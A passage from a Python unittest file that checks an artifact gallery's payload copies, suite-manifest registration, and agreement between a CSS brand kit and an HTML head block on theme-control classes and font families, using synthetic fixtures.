    return _path_set_failures(gallery_root, dist_root, CODEX)


def check_f3(gallery_root: Path, dist_root: Path = DIST_ROOT) -> list[str]:
    """F3 — each source file is byte-identical to its Claude payload copy.

    A path set cannot see a copy that arrived truncated or stale — least of all
    ``manifest.json``, whose silent divergence would leave a consumer routing
    against a different catalog than the repository declares.
    """
    return _content_failures(gallery_root, dist_root, CLAUDE)


def check_f4(gallery_root: Path, dist_root: Path = DIST_ROOT) -> list[str]:
    """F4 — each source file is byte-identical to its **Codex** payload copy.

    Safe only because F5 holds. The Codex build runs
    ``rewrite_payload_skill_paths_xplat008`` over every file in its payload and
    writes the file back only if the substitution changed it, so on a file
    carrying no matching literal the rewrite is a verified no-op and this check
    is exactly as stable as F3.
    """
    return _content_failures(gallery_root, dist_root, CODEX)


def check_f5(gallery_root: Path) -> list[str]:
    """F5 — no source gallery file carries a reference the rewriter would match.

    Defined by ``REL_SKILL_PATH_XPLAT008`` itself, imported from the build
    rather than restated here, so the check and the build agree by construction.
    A substring search for the same path prefix would fail ``SPA-CONTRACT.md``
    for documenting this very rule to authors: the rewriter requires at least
    one character after the ``skills/`` segment drawn from a class that excludes
    the backtick, so a backticked prose mention does not match.

    A file the rewriter cannot decode is skipped here for the reason the
    rewriter skips it: it returns early on a ``UnicodeDecodeError`` and rewrites
    nothing.
    """
    failures: list[str] = []
    for path in _gallery_files(gallery_root):
        try:
            text = path.read_text(encoding="utf-8")
        except UnicodeDecodeError:
            continue
        match = REL_SKILL_PATH_XPLAT008.search(text)
        if match is not None:
            failures.append(
                f"{_label(gallery_root, path)}: contains '{match.group(0)}', which the Codex payload build "
                "rewrites, so this file's Codex copy would not be byte-identical to its source (F4)"
            )
    return failures


GROUP_F_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("F1", check_f1),
    ("F2", check_f2),
    ("F3", check_f3),
    ("F4", check_f4),
    ("F5", check_f5),
)


class PayloadReachTests(unittest.TestCase):
    """Group F against the shipped gallery and the committed payloads.

    This is the one group whose real-gallery case is the whole point. The
    existing payload gates compare a fresh build against committed ``dist/``,
    both sides scanned from payload roots — a directory absent from both is
    self-consistently absent and passes. Which is why the non-vacuity case below
    is not decoration: two empty path sets are equal.
    """

    def test_group_f_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_F_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])

    def test_both_sides_are_non_empty_so_set_equality_means_something(self) -> None:
        self.assertTrue(_relative_files(GALLERY_ROOT), "the gallery source is empty — F1/F2 assert nothing")
        for platform in PAYLOAD_PLATFORMS:
            with self.subTest(msg=platform):
                self.assertTrue(
                    _relative_files(_payload_gallery(DIST_ROOT, platform)),
                    f"the {platform} payload carries no gallery — the FR-018 failure this group exists for",
                )

    def test_f5_does_not_fire_on_the_contract_document_that_records_the_rule(self) -> None:
        """The proof F5 is the rewriter's pattern and not a substring search."""
        contract = _document_text(GALLERY_ROOT / SPA_CONTRACT_FILE)
        self.assertIn(f"..{chr(47)}skills{chr(47)}", contract, "the authoring rule is no longer documented")
        self.assertEqual(check_f5(GALLERY_ROOT), [])

    def test_the_rewriter_pattern_is_the_live_one(self) -> None:
        """Non-vacuity: an unmatchable pattern would make F5 pass on anything."""
        self.assertIsNotNone(REL_SKILL_PATH_XPLAT008.search("../skills/a/SKILL.md"))


# --- Group F fixtures ------------------------------------------------------

FIXTURE_PAYLOAD_FILE = "brand-kit.css"
FIXTURE_PAYLOAD_TEXT = ":root {\n  --rc-surface: #faf9f7;\n}\n"
FIXTURE_REWRITTEN_REFERENCE = "../skills/speckit-autopilot/SKILL.md"


class PayloadReachFixtureCase(GalleryFixtureCase):
    """A synthetic gallery and a synthetic pair of payload roots beside it."""

    def setUp(self) -> None:
        super().setUp()
        self.dist = Path(self._tmp.name).resolve() / "dist"

    def write_payload(self, platform: str, relative: str, text: str) -> Path:
        path = _payload_gallery(self.dist, platform) / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        with path.open("w", encoding="utf-8", newline="") as handle:
            handle.write(text)
        return path

    def ship(self, relative: str = FIXTURE_PAYLOAD_FILE, text: str = FIXTURE_PAYLOAD_TEXT) -> None:
        """One file in the source and an identical copy in both payloads."""
        self.write(relative, text)
        for platform in PAYLOAD_PLATFORMS:
            self.write_payload(platform, relative, text)

    def failures(self) -> list[str]:
        return [
            failure
            for check in (check_f1, check_f2, check_f3, check_f4)
            for failure in check(self.gallery, self.dist)
        ] + check_f5(self.gallery)


class PayloadReachFixtureTests(PayloadReachFixtureCase):
    """Group F against a synthetic source tree and synthetic payload roots."""

    def test_a_gallery_copied_intact_to_both_payloads_passes(self) -> None:
        self.ship()

        self.assertEqual(self.failures(), [])

    # -- F1/F2: the set equality, in both directions, on both platforms --

    def test_f1_and_f2_reject_a_gallery_absent_from_a_payload(self) -> None:
        """The standing FR-018 failure: fail-silent copy, no build error, green suite."""
        for platform, check in ((CLAUDE, check_f1), (CODEX, check_f2)):
            with self.subTest(msg=platform):
                self.setUp()
                self.write(FIXTURE_PAYLOAD_FILE, FIXTURE_PAYLOAD_TEXT)
                other = CODEX if platform == CLAUDE else CLAUDE
                self.write_payload(other, FIXTURE_PAYLOAD_FILE, FIXTURE_PAYLOAD_TEXT)

                self.assertReports(check(self.gallery, self.dist), FIXTURE_PAYLOAD_FILE, platform)

    def test_f1_and_f2_reject_a_file_the_payload_carries_and_the_source_does_not(self) -> None:
        for platform, check in ((CLAUDE, check_f1), (CODEX, check_f2)):
            with self.subTest(msg=platform):
                self.setUp()
                self.ship()
                self.write_payload(platform, "templates/stale.html", "<!doctype html>\n")

                self.assertReports(check(self.gallery, self.dist), "templates/stale.html", platform)

    def test_f1_and_f2_reject_a_nested_file_missing_from_a_payload(self) -> None:
        for platform, check in ((CLAUDE, check_f1), (CODEX, check_f2)):
            with self.subTest(msg=platform):
                self.setUp()
                self.ship()
                self.write("templates/sample.html", "<!doctype html>\n")
                other = CODEX if platform == CLAUDE else CLAUDE
                self.write_payload(other, "templates/sample.html", "<!doctype html>\n")

                self.assertReports(check(self.gallery, self.dist), "templates/sample.html", platform)

    # -- F3/F4: byte equality, which a path set cannot see --

    def test_f3_and_f4_reject_a_payload_copy_that_differs_by_one_byte(self) -> None:
        for platform, check in ((CLAUDE, check_f3), (CODEX, check_f4)):
            with self.subTest(msg=platform):
                self.setUp()
                self.ship()
                self.write_payload(platform, FIXTURE_PAYLOAD_FILE, FIXTURE_PAYLOAD_TEXT.replace("#faf", "#fbf"))

                self.assertReports(check(self.gallery, self.dist), FIXTURE_PAYLOAD_FILE, platform)

    def test_f3_and_f4_reject_a_truncated_payload_copy(self) -> None:
        for platform, check in ((CLAUDE, check_f3), (CODEX, check_f4)):
            with self.subTest(msg=platform):
                self.setUp()
                self.ship(relative=MANIFEST_FILE, text='{"schema_version": "1.0"}\n')
                self.write_payload(platform, MANIFEST_FILE, '{"schema_version": "1.0"}')

                self.assertReports(check(self.gallery, self.dist), MANIFEST_FILE, platform)

    def test_f3_and_f4_see_a_line_ending_that_a_path_set_cannot(self) -> None:
        for platform, check in ((CLAUDE, check_f3), (CODEX, check_f4)):
            with self.subTest(msg=platform):
                self.setUp()
                self.ship()
                self.write_payload(platform, FIXTURE_PAYLOAD_FILE, FIXTURE_PAYLOAD_TEXT.replace("\n", "\r\n"))

                self.assertEqual(check_f1(self.gallery, self.dist), [])
                self.assertReports(check(self.gallery, self.dist), FIXTURE_PAYLOAD_FILE, platform)

    # -- F5: the authoring rule F4 depends on, by the rewriter's own pattern --

    def test_f5_rejects_a_reference_the_codex_rewriter_would_match(self) -> None:
        self.write(FIXTURE_PAYLOAD_FILE, f"/* see {FIXTURE_REWRITTEN_REFERENCE} */\n")

        self.assertReports(check_f5(self.gallery), FIXTURE_PAYLOAD_FILE, FIXTURE_REWRITTEN_REFERENCE)

    def test_f5_rejects_a_reference_in_any_gallery_file_not_only_an_artifact(self) -> None:
        self.write("SPA-CONTRACT.md", f"[autopilot]({FIXTURE_REWRITTEN_REFERENCE})\n")

        self.assertReports(check_f5(self.gallery), "SPA-CONTRACT.md")

    def test_f5_accepts_the_backticked_mention_a_substring_check_would_reject(self) -> None:
        mention = f"`..{chr(47)}skills{chr(47)}`"
        self.write("SPA-CONTRACT.md", f"Refer to a skill by a path under {mention}, followed by a file.\n")

        self.assertIn(f"..{chr(47)}skills{chr(47)}", _document_text(self.gallery / "SPA-CONTRACT.md"))
        self.assertEqual(check_f5(self.gallery), [])


# ---------------------------------------------------------------------------
# Group H — suite integration (FR-014)
# ---------------------------------------------------------------------------

SUITE_MANIFEST = REPO_ROOT / "tests" / "speckit-pro" / "suite-manifest.json"
UNIT_LAYER_ID = "4"
REGISTERED_TEST = "tests/speckit-pro/unit/test-artifact-gallery.py"


def check_h1(gallery_root: Path, manifest_path: Path = SUITE_MANIFEST) -> list[str]:
    """H1 — this test is registered in the Layer 4 ``scripts`` array.

    ``gallery_root`` is unused: H1 reads the suite manifest, not the gallery.
    The parameter is taken anyway because ``CheckSignatureTests`` enforces the
    rule module-wide, and one check quietly opting out of a rule is the first
    step of the drift the rule exists to stop.
    """
    label = manifest_path.name
    if not manifest_path.is_file():
        return [f"{label}: the suite manifest is missing, so '{REGISTERED_TEST}' has nothing to register in"]
    try:
        manifest = json.loads(_read_exact(manifest_path))
    except (UnicodeDecodeError, json.JSONDecodeError) as error:
        return [f"{label}: the suite manifest is unreadable, so registration cannot be checked: {error}"]
    layers = manifest.get("layers") if isinstance(manifest, dict) else None
    if not isinstance(layers, list):
        return [
            f"{label}: key 'layers': expected an array, so layer '{UNIT_LAYER_ID}' cannot be located and "
            f"'{REGISTERED_TEST}' cannot be found registered in it"
        ]
    layer = next((item for item in layers if isinstance(item, dict) and item.get("id") == UNIT_LAYER_ID), None)
    if layer is None:
        return [f"{label}: no layer carries id '{UNIT_LAYER_ID}', so '{REGISTERED_TEST}' has no layer to run in"]
    scripts = layer.get("scripts")
    if not isinstance(scripts, list):
        return [
            f"{label}: layer '{UNIT_LAYER_ID}': key 'scripts': expected an array, so '{REGISTERED_TEST}' "
            "cannot be registered"
        ]
    registered = {entry.get("path") for entry in scripts if isinstance(entry, dict)}
    if REGISTERED_TEST not in registered:
        return [
            f"{label}: layer '{UNIT_LAYER_ID}': '{REGISTERED_TEST}' is absent from the 'scripts' array, so a "
            "plain suite run never executes it and every check in this file is unreached"
        ]
    return []


GROUP_H_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (("H1", check_h1),)


class SuiteRegistrationTests(unittest.TestCase):
    """Group H against the committed suite manifest."""

    def test_group_h_passes_against_the_committed_manifest(self) -> None:
        for name, check in GROUP_H_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])

    def test_the_registered_path_is_this_file(self) -> None:
        """Non-vacuity: a registered path naming some other file proves nothing."""
        self.assertEqual((REPO_ROOT / REGISTERED_TEST).resolve(), Path(__file__).resolve())


# --- Group H fixtures ------------------------------------------------------


class SuiteRegistrationFixtureCase(GalleryFixtureCase):
    """A synthetic suite manifest, so every way registration fails is exercised."""

    def write_suite_manifest(self, manifest: object, *, name: str = "suite-manifest.json") -> Path:
        path = self.gallery / name
        with path.open("w", encoding="utf-8", newline="") as handle:
            handle.write(json.dumps(manifest, indent=2))
        return path

    def manifest(self, *, scripts: list[dict] | None = None, layer_id: str = UNIT_LAYER_ID) -> dict:
        registered = [{"path": REGISTERED_TEST, "label": "test-artifact-gallery", "baseline": None}]
        return {
            "schema_version": "1.0",
            "layers": [
                {"id": "1", "label": "Structural Validation", "scripts": []},
                {"id": layer_id, "label": "Unit Tests", "scripts": registered if scripts is None else scripts},
            ],
        }


class SuiteRegistrationFixtureTests(SuiteRegistrationFixtureCase):
    """H1 against synthetic manifests built in a temporary directory."""

    def test_a_registered_test_passes(self) -> None:
        path = self.write_suite_manifest(self.manifest())

        self.assertEqual(check_h1(self.gallery, path), [])

    def test_h1_rejects_a_manifest_that_does_not_register_the_test(self) -> None:
        path = self.write_suite_manifest(self.manifest(scripts=[]))

        self.assertReports(check_h1(self.gallery, path), REGISTERED_TEST, UNIT_LAYER_ID)

    def test_h1_rejects_a_registration_in_some_other_layer(self) -> None:
        path = self.write_suite_manifest(self.manifest(layer_id="7"))

        self.assertReports(check_h1(self.gallery, path), UNIT_LAYER_ID)

    def test_h1_rejects_a_registration_naming_a_different_test(self) -> None:
        other = [{"path": "tests/speckit-pro/unit/test-docs-artifact.py", "label": "other", "baseline": None}]
        path = self.write_suite_manifest(self.manifest(scripts=other))

        self.assertReports(check_h1(self.gallery, path), REGISTERED_TEST)

    def test_h1_rejects_a_missing_manifest(self) -> None:
        self.assertReports(check_h1(self.gallery, self.gallery / "absent.json"), "absent.json")

    def test_h1_rejects_an_unreadable_manifest(self) -> None:
        path = self.gallery / "suite-manifest.json"
        with path.open("w", encoding="utf-8", newline="") as handle:
            handle.write("{not json")

        self.assertReports(check_h1(self.gallery, path), "suite-manifest.json")

    def test_h1_rejects_a_manifest_carrying_no_layers_array(self) -> None:
        path = self.write_suite_manifest({"schema_version": "1.0"})

        self.assertReports(check_h1(self.gallery, path), "layers")

    def test_h1_rejects_a_layer_carrying_no_scripts_array(self) -> None:
        path = self.write_suite_manifest(
            {"schema_version": "1.0", "layers": [{"id": UNIT_LAYER_ID, "label": "Unit Tests"}]}
        )

        self.assertReports(check_h1(self.gallery, path), "scripts")


# ---------------------------------------------------------------------------
# Group K — Canonical-block cross-file agreement (FR-022, FR-024)
# ---------------------------------------------------------------------------
#
# Both rows here are closure between the **two canonical files**, the same shape
# as C8 closing the catalog's vocabulary against the contract document's prose.
# Each names a value one file writes and the other consumes with nothing binding
# them, so the value is extracted from each file and compared — and a rename in
# either file fails rather than silently reverting the behaviour.
#
# This is the group's whole reason to exist. Group A catches drift between a
# canonical region and an artifact's copy of it; group I catches a construct
# omitted from a copied region. Neither can see two regions that are each
# internally correct and disagree with each other, which is a third failure mode
# and the one that has actually shipped: the theme control went out unstyled and
# was caught in a browser screenshot rather than here, because I4 asserts a
# button carrying a name and a state and says nothing about the class the kit
# styles it by.
#
# Nothing here holds a copy of an agreed value. What it holds is a **locator**
# for each side — how a class is set, how a typeface stack is spelled, which
# query parameter names a family — which is the distinction C8 already records
# for naming a section heading without restating the vocabulary under it.

# Every spelling that puts a class on an element, each with exactly two groups:
# the element the class is set on, where the spelling names one, and the class
# expression. The tolerance mirrors I4's — the assertion is about the class an
# element carries, not about how the region spells the assignment. The markup
# form is matched here rather than through group E's parser because a class
# written inside a script string is not markup any parser sees: script content is
# raw text, so ``innerHTML = '<svg class="…">'`` reaches no element collector.
_CLASS_SETTER_RES: tuple[re.Pattern[str], ...] = (
    re.compile(r"""(?:([\w$]+)\s*\.\s*)?className\s*=(?!=)\s*([^;\n]+)"""),
    re.compile(r"""(?:([\w$]+)\s*\.\s*)?classList\s*\.\s*add\(([^)]*)\)"""),
    re.compile(r"""(?:([\w$]+)\s*\.\s*)?setAttribute\(\s*['"]class['"]\s*,\s*([^)]*)\)"""),
    re.compile(r"""()<[^<>]*?\sclass\s*=\s*("[^"]*"|'[^']*')"""),
)

# The identifier a script-created button is bound to. The control's own class is
# asserted through this binding rather than through whatever classes the region
# happens to set, because "the control carries no class" is exactly what I4
# admits and exactly what shipped — and any other styled class in the region
# would satisfy a check that only compared the region's class names in bulk.
_CONTROL_BINDING_RE = re.compile(r"""([\w$]+)\s*=\s*[^;\n]*createElement\(\s*['"]button['"]""")

# A class in **selector** position. Applied to rule preludes only, so a class
# name written in a declaration value styles nothing and counts for nothing.
_CLASS_SELECTOR_RE = re.compile(r"\.(-?[A-Za-z_][\w-]*)")


def _class_assignments(region: str) -> list[tuple[str, str]]:
    """``(element, class expression)`` for every class the region sets.

    The element is the empty string for the markup form, which names none. A
    comma-separated argument list is split, so ``classList.add(a, b)`` is two
    assignments rather than one unparsable expression.
    """
    return [
        (match.group(1) or "", argument.strip())
        for pattern in _CLASS_SETTER_RES
        for match in pattern.finditer(region)
        for argument in match.group(2).split(",")
        if argument.strip()
    ]


def _resolved_classes(region: str, assignments: list[tuple[str, str]]) -> tuple[set[str], list[str]]:
    """The class names those assignments resolve to, and the ones resolving to none.

    Resolution is I6's ``_key_literal``: a quoted literal, or an identifier bound
    to one **inside the region**. An identifier bound above the start marker
    resolves to nothing and is reported, which is the same containment failure
    I6 reports for a storage key rather than an inconvenience.
    """
    names: set[str] = set()
    unresolved: list[str] = []
    for _, expression in assignments:
        literal = _key_literal(region, expression)
        if literal is None:
            unresolved.append(expression)
        else:
            names.update(literal.split())
    return names, unresolved


def _styled_classes(region: str) -> set[str]:
    """Every class the brand region carries a rule for."""
    return {
        name for prelude, _ in _RULE_RE.findall(region) for name in _CLASS_SELECTOR_RE.findall(prelude)
    }


def check_k1(gallery_root: Path) -> list[str]:
    """K1 — the class the head block sets is a class the brand kit styles.

    Two clauses, and the second does not imply the first. The control the region
    builds must carry a class **at all** — I4 admits a button with none, and a
    button with none is what shipped, caught in a browser screenshot rather than
    here — and every class the region sets must have a rule inside the brand
    region, which is what makes a rename in *either* file fail rather than
    silently returning the control to a browser default in all 21 artifacts.

    Both sides are read from inside the marked regions, because the regions are
    what the artifacts carry: a rule above the brand start marker reads as
    correct in ``brand-kit.css`` and styles nothing anywhere, the same
    inside-versus-outside distinction the rest of this file's canonical-block
    checks turn on.

    Only one direction is asserted. A class the kit styles and the head block
    never sets is not a defect — the kit legitimately carries rules a template
    opts into — while a class the head block sets and the kit never styles is the
    unstyled ship. Both one-sided renames are caught by that single direction,
    since each leaves the head block naming a class no rule matches.
    """
    head, unreadable = _shared_region(gallery_root, HEAD_BLOCK, "the theme control's class")
    if head is None:
        return unreadable
    kit, kit_unreadable = _shared_region(gallery_root, BRAND_BLOCK, "the rule styling the theme control")
    if kit is None:
        return kit_unreadable
    head_name = CANONICAL_FILES[HEAD_BLOCK]
    kit_name = CANONICAL_FILES[BRAND_BLOCK]
    assignments = _class_assignments(head)
    names, unresolved = _resolved_classes(head, assignments)
    failures = [
        f"{head_name}: block {HEAD_BLOCK}: the class expression '{expression}' resolves to no string literal "
        f"inside the marked region, so whatever it is bound to above the start marker reaches no artifact and "
        f"nothing in {kit_name} can be compared against it"
        for expression in unresolved
    ]
    controls = set(_CONTROL_BINDING_RE.findall(head))
    if controls and not any(element in controls for element, _ in assignments):
        failures.append(
            f"{head_name}: block {HEAD_BLOCK}: builds the theme control and puts no class on it, so "
            f"{kit_name}: block {BRAND_BLOCK}: has no selector to reach it and the control renders as a "
            "browser default in every artifact — which I4 passes, because it asks for a button with a name "
            "and a state and not for the class the kit styles it by"
        )
    failures.extend(
        f"{head_name}: block {HEAD_BLOCK}: sets class '{name}', and {kit_name}: block {BRAND_BLOCK}: carries "
        f"no '.{name}' rule inside its marked region — the two files hold that name independently, so a "
        "rename in either ships the element unstyled to every artifact"
        for name in sorted(names.difference(_styled_classes(kit)))
    )
    return failures


# The generic families CSS itself defines. A declaration naming one of these is a
# typeface stack, whatever the property is called — which is what keeps this off
# the kit's own naming convention, so a stack added under a property name nobody
# anticipated is still read. And a stack whose *first* component is one of them
# asks the provider for nothing, so it names no family to agree about.
CSS_GENERIC_FAMILIES: frozenset[str] = frozenset(
    {
        "serif",
        "sans-serif",
        "monospace",
        "cursive",
        "fantasy",
        "math",
        "system-ui",
        "ui-serif",
        "ui-sans-serif",
        "ui-monospace",
        "ui-rounded",
    }
)

# The provider's parameter naming one family, and the separator between a family
# and the axis values requested for it. Weight coverage is deliberately out of
# scope: K2 is about which families are requested at all, since an unrequested
# family falls through to a fallback while an unrequested weight is synthesised.
FONT_FAMILY_PARAMETER = "family"
FONT_AXIS_SEPARATOR = ":"

_QUOTED_RE = re.compile(r"""['"](.*)['"]""")


def _unquoted(component: str) -> str:
    """A stack component with its optional quoting removed."""
    match = _QUOTED_RE.fullmatch(component.strip())
    return match.group(1).strip() if match else component.strip()


def _led_families(text: str) -> set[str]:
    """The families named **first** in the kit's typeface stacks.

    A font stack is located by naming a CSS generic family; its lead component is
    the face the provider has to serve, since ``font-family`` is a preference
    list and the first available face wins. A lead that is itself a generic
    family names no provider face and is skipped. A lead that is some other
    system face is *not* skipped: the kit's own rule is that the brand face leads
    every stack, so a stack led by a system face is a defect either way.
    """
    families: set[str] = set()
    for _, body in _RULE_RE.findall(_strip_comments(text)):
        for declaration in body.split(";"):
            _, separator, value = declaration.partition(":")
            if not separator:
                continue
            components = [component.strip() for component in value.split(",") if component.strip()]
            if not any(component.casefold() in CSS_GENERIC_FAMILIES for component in components):
                continue
            lead = _unquoted(components[0])
            if lead and lead.casefold() not in CSS_GENERIC_FAMILIES:
                families.add(lead)
    return families


def _requested_families(gallery_root: Path) -> set[str]:
    """The families the canonical head file asks the font provider for.

    Read through group E's collector rather than off the file text, so what is
    compared is the request a parser sees: the shipped file writes the parameter
    separator as a character reference, and a text scan would read the whole
    family list as one parameter and compare the wrong set.
    """
    families: set[str] = set()
    for reference in _resource_references(gallery_root):
        if reference.label != CANONICAL_FILES[HEAD_BLOCK] or STYLESHEET_RELATION not in reference.relations:
            continue
        parsed = _parsed(reference.value)
        if parsed is None or (parsed.hostname or "").casefold() != FONT_STYLESHEET_HOST:
            continue
        for requested in parse_qs(parsed.query).get(FONT_FAMILY_PARAMETER, []):
            family = requested.split(FONT_AXIS_SEPARATOR)[0].strip()
            if family:
                families.add(family)
    return families


def check_k2(gallery_root: Path) -> list[str]:
    """K2 — the kit's typeface stacks and the head block's font request agree.

    Set equality in both directions, on **families only**. A family the kit leads
    a stack with and the request omits is the silent one: ``font-family`` is a
    preference list, so every artifact falls through to the next face in the
    stack, renders plausibly, and reports nothing — E4 cannot see it, because the
    request it validates is well formed. A family the request names and no stack
    leads with is the mirror, and costs every artifact a fetch nothing uses.

    Weight coverage is out of scope by decision, not by omission: an unrequested
    axis value is synthesised by the engine, while an unrequested family is not
    served at all. Comparing the axis values would make this check fail on every
    ordinary weight change and teach a reader to edit it rather than read it.

    Both sides are read from the **files** rather than from the marked regions.
    The head block declares the typeface request to be the artifact's own, so
    nothing fixes it inside the region and a region-scoped read would be looking
    where the contract makes no promise.

    Absence needs no clause of its own. A missing file, a moved request, or a
    deleted stack empties one side, and every member of the other side is then
    reported by name — louder than a skip, and it names the file that lost the
    value.
    """
    kit_path = gallery_root / CANONICAL_FILES[BRAND_BLOCK]
    head_name = CANONICAL_FILES[HEAD_BLOCK]
    kit_name = CANONICAL_FILES[BRAND_BLOCK]
    named = _led_families(_document_text(kit_path)) if kit_path.is_file() else set()
    requested = _requested_families(gallery_root)
    return [
        f"{kit_name}: leads a typeface stack with '{name}', and {head_name}: names it in no "
        f"'{FONT_FAMILY_PARAMETER}' parameter of its {FONT_STYLESHEET_HOST} request, so every artifact falls "
        "through to the next face in the stack and nothing reports it"
        for name in sorted(named.difference(requested))
    ] + [
        f"{head_name}: requests '{name}' from {FONT_STYLESHEET_HOST}, and {kit_name}: leads no typeface stack "
        "with it, so every artifact fetches a face nothing uses"
        for name in sorted(requested.difference(named))
    ]


GROUP_K_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
    ("K1", check_k1),
    ("K2", check_k2),
)


class CanonicalBlockAgreementTests(unittest.TestCase):
    """Group K against the two shipped canonical files."""

    def test_group_k_passes_against_the_shipped_gallery(self) -> None:
        for name, check in GROUP_K_CHECKS:
            with self.subTest(msg=name):
                self.assertEqual(check(GALLERY_ROOT), [])

    def test_the_shipped_files_carry_both_sides_of_each_agreement(self) -> None:
        """Non-vacuity: an equality between two empty sets passes and proves nothing.

        K1 reports a region that sets no class, so its own emptiness is a
        failure. K2's set comparison has no such floor — two absent sides agree —
        so the sides are asserted non-empty here rather than left to be discovered
        the next time a request or a stack is moved.
        """
        head = _shared_region(GALLERY_ROOT, HEAD_BLOCK, "the theme control's class")[0] or ""
        kit_text = _document_text(GALLERY_ROOT / CANONICAL_FILES[BRAND_BLOCK])

        self.assertTrue(_resolved_classes(head, _class_assignments(head))[0], "the head region sets no class")
        self.assertTrue(_styled_classes(_strip_comments(kit_text)), "the kit styles no class")
        self.assertTrue(_led_families(kit_text), "the kit names no typeface stack")
        self.assertTrue(_requested_families(GALLERY_ROOT), "the head file requests no family")


# --- Group K fixtures ------------------------------------------------------
#
# The fixtures name synthetic classes and synthetic typefaces throughout. That is
# the evidence that neither check holds the shipped value: a check carrying
# ``rc-theme-toggle`` or a real family name would fail every case below.

FIXTURE_CONTROL_CLASS = "rc-fixture-toggle"
FIXTURE_MARK_CLASS = "rc-fixture-mark"
FIXTURE_RENAMED_CLASS = "rc-fixture-switch"
FIXTURE_DISPLAY_FAMILY = "Fixture Display"
FIXTURE_BODY_FAMILY = "Fixture Body"
FIXTURE_ADDED_FAMILY = "Fixture Serif"

# Written the way the shipped file writes it: the parameter separator is a
# character reference, so a fixture that spelled it ``&`` would let a text scan
# pass and would stop proving that the parse is what is compared.
FIXTURE_FONT_REQUEST = (
    "https://fonts.googleapis.com/css2"
    "?family=Fixture+Display:wght@400;700"
    "&amp;family=Fixture+Body:wght@400;500"
    "&amp;display=swap"
)

FIXTURE_DISPLAY_STACK = f"  --rc-font-display: '{FIXTURE_DISPLAY_FAMILY}', 'Trebuchet MS', system-ui, sans-serif;\n"
FIXTURE_BODY_STACK = f"  --rc-font-body: '{FIXTURE_BODY_FAMILY}', Arial, system-ui, sans-serif;\n"
FIXTURE_CONTROL_RULE = f".{FIXTURE_CONTROL_CLASS} {{\n  position: fixed;\n  top: 1rem;\n}}"
FIXTURE_MARK_RULE = f".{FIXTURE_MARK_CLASS} {{\n  height: 2rem;\n}}"

FIXTURE_AGREEING_KIT = (
    f":root {{\n{FIXTURE_DISPLAY_STACK}{FIXTURE_BODY_STACK}}}\n\n"
    f"{FIXTURE_CONTROL_RULE}\n\n"
    f"{FIXTURE_MARK_RULE}"
)

FIXTURE_CLASS_ASSIGNMENT = f"    control.className = '{FIXTURE_CONTROL_CLASS}';\n"
FIXTURE_MARK_MARKUP = f"""      host.innerHTML = '<svg class="{FIXTURE_MARK_CLASS}" aria-hidden="true"></svg>';\n"""

FIXTURE_AGREEING_HEAD = (
    f'<link rel="stylesheet" href="{FIXTURE_FONT_REQUEST}">\n'
    "<script>\n"
    "(function () {\n"
    "  document.addEventListener('DOMContentLoaded', function () {\n"
    "    var control = document.createElement('button');\n"
    f"{FIXTURE_CLASS_ASSIGNMENT}"
    "    document.body.insertBefore(control, document.body.firstChild);\n"
    "    var host = document.querySelector('[data-rc-fixture-mark]');\n"
    "    if (host) {\n"
    f"{FIXTURE_MARK_MARKUP}"
    "    }\n"
    "  });\n"
    "})();\n"
    "</script>"
)


class CanonicalBlockAgreementFixtureCase(GalleryFixtureCase):
    """A synthetic pair of canonical files that agree with each other.

    Every rejection below edits **one** of the two, which is the failure mode: a
    coordinated edit is a working change, and a one-sided edit is the silent
    revert neither group A nor group I can see.
    """

    def setUp(self) -> None:
        super().setUp()
        self.write_kit()
        self.write_head()

    def write_kit(self, *, body: str = FIXTURE_AGREEING_KIT, above: str = "") -> None:
        self.write(CANONICAL_FILES[BRAND_BLOCK], above + _marked(BRAND_BLOCK, body) + "\n")

    def write_head(self, *, body: str = FIXTURE_AGREEING_HEAD, above: str = "") -> None:
        self.write(CANONICAL_FILES[HEAD_BLOCK], above + _marked(HEAD_BLOCK, body) + "\n")

    def assertPairReports(self, failures: list[str], *fragments: str) -> None:
        """One failure naming **both** files and the disagreeing value.

        Naming one file is not enough for this group: the reader has to be told
        which two things disagree, or the message sends them to edit the file
        that was already right.
        """
        self.assertReports(
            failures, CANONICAL_FILES[HEAD_BLOCK], CANONICAL_FILES[BRAND_BLOCK], *fragments
        )


class CanonicalBlockAgreementFixtureTests(CanonicalBlockAgreementFixtureCase):
    """Group K against synthetic canonical pairs built in a temporary directory."""

    # -- K1: the class one file sets and the other styles --

    def test_k1_accepts_a_class_the_kit_styles(self) -> None:
        self.assertEqual(check_k1(self.gallery), [])

    def test_k1_rejects_a_class_renamed_in_the_head_block_only(self) -> None:
        self.write_head(
            body=FIXTURE_AGREEING_HEAD.replace(FIXTURE_CONTROL_CLASS, FIXTURE_RENAMED_CLASS)
        )

        self.assertPairReports(check_k1(self.gallery), FIXTURE_RENAMED_CLASS)

    def test_k1_rejects_a_class_renamed_in_the_kit_only(self) -> None:
        self.write_kit(body=FIXTURE_AGREEING_KIT.replace(FIXTURE_CONTROL_CLASS, FIXTURE_RENAMED_CLASS))

        self.assertPairReports(check_k1(self.gallery), FIXTURE_CONTROL_CLASS)

    def test_k1_rejects_a_control_carrying_no_class_at_all(self) -> None:
        """The state that shipped: I4 passes a button with no class on it."""
        self.write_head(body=_without(FIXTURE_AGREEING_HEAD, FIXTURE_CLASS_ASSIGNMENT))

        self.assertPairReports(check_k1(self.gallery), "no class")

    def test_k1_rejects_a_control_class_the_kit_only_mentions_in_a_comment(self) -> None:
        """Commentary is not a rule — a described class styles nothing."""
        self.write_kit(
            body=_without(FIXTURE_AGREEING_KIT, FIXTURE_CONTROL_RULE) + f"\n/* Ports own:\n{FIXTURE_CONTROL_RULE} */"
        )

        self.assertPairReports(check_k1(self.gallery), FIXTURE_CONTROL_CLASS)

    def test_k1_rejects_a_rule_placed_above_the_kit_start_marker(self) -> None:
        """A rule outside the copied region reaches none of the 21 artifacts."""
        self.write_kit(
            body=_without(FIXTURE_AGREEING_KIT, FIXTURE_CONTROL_RULE),
            above=FIXTURE_CONTROL_RULE + "\n",
        )

        self.assertPairReports(check_k1(self.gallery), FIXTURE_CONTROL_CLASS)

    def test_k1_rejects_a_class_named_only_in_a_declaration_value(self) -> None:
        """A class name in a value is not a selector, so it styles nothing."""
